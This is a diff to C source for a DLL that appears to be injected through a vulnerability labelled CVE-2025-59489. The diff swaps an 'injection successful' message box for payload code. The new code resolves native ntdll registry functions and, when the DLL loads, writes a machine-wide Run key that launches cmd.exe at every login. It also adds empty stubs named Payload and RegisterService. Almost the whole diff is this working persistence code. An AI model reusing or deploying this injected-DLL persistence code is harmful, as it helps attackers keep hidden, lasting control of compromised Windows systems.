@@ -66,8 +66,6 @@ void* GetProcAddressByHash(HMODULE hModule, const char* targetHash) {
     return NULL;
 }
 
-
-
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH:
@@ -82,16 +80,86 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 }
 
 
+typedef NTSTATUS (NTAPI *pNtOpenKey)(
+    PHANDLE            KeyHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes
+);
+
+typedef NTSTATUS (NTAPI *pNtSetValueKey)(
+    HANDLE           KeyHandle,
+    PUNICODE_STRING  ValueName,
+    ULONG            TitleIndex,
+    ULONG            Type,
+    PVOID            Data,
+    ULONG            DataSize
+);
+
+typedef NTSTATUS (NTAPI *pNtClose)(
+    HANDLE          KeyHandle
+);
+
 
 void OnProcessAttach() {
-    HMODULE kernel32 = GetLibraryBase(L"USER32.dll");
-    void *( * messageBoxFunc )(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType) = GetProcAddressByHash(kernel32, "MessageBoxA");
+    HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
+    pNtSetValueKey setKey = (pNtSetValueKey)GetProcAddress(ntdll, "NtSetValueKey");
+    pNtOpenKey openKey = (pNtOpenKey)GetProcAddress(ntdll, "NtOpenKey");
+    pNtClose closeKey = (pNtClose)GetProcAddress(ntdll, "NtClose");
 
-    messageBoxFunc(nullptr,
-                           "C Library Injection Successful!",
-                           "CVE-2025-59489 Test",
-                           MB_OK | MB_ICONEXCLAMATION);
+
+    UNICODE_STRING registryPath, name;
+    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+    auto program = L"C:\\Windows\\System32\\cmd.exe";
+    InitUnicodeString(&name, L"TestingRegistry");
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);
+
+    HANDLE hKey = NULL;
+    NTSTATUS openResult = openKey(&hKey, KEY_WRITE | KEY_SET_VALUE, &objAttr);
+
+    if (openResult == 0) {
+        auto result = setKey(hKey, &name, 0, REG_SZ, (void *) program, (ULONG)((wcslen(program) + 1) * sizeof(WCHAR)));
+        if (result != 0) {
+
+            char errorMsg[64];
+            sprintf(errorMsg, "Write unsuccessful. NTSTATUS: 0x%08X", result);
+            MessageBoxA(nullptr, errorMsg, "ERROR", MB_OK | MB_ICONERROR);
+        }
+    } else {
+        MessageBoxA(nullptr,"Key has not been opened",
+                           "ERROR",
+                           MB_OK | MB_ICONERROR);
+    }
+
+
+    closeKey(hKey);
 }
+void Payload() {
+
+}
+
+
+
+void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
+    if (SourceString) {
+        USHORT length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR));
+        DestinationString->Length = length;
+        DestinationString->MaximumLength = length + sizeof(WCHAR);
+        DestinationString->Buffer = (PWSTR)SourceString;
+    } else {
+        DestinationString->Length = 0;
+        DestinationString->MaximumLength = 0;
+        DestinationString->Buffer = NULL;
+    }
+}
+
+int RegisterService(HMODULE ntdll) {
+
+
+    return 0;
+}
+
 
 
 
